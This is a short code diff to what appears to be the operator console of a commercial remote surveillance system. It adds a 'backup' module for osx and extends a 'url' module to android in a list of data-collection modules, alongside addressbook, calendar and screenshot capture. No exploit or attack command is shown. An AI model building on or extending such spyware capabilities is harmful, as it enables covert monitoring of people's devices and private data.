@@ -43,6 +43,8 @@ package it.ht.rcs.console
 			var modules:Array=[{module: "addressbook", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "application", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+        
+        {module: "backup", _type: "desktop", _platform: "osx"},
 
 				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,winphone"},
 
@@ -90,7 +92,7 @@ package it.ht.rcs.console
 
 				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux"}];
+				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux,android"}];
 
 			if (skipFilter)
 				return modules;
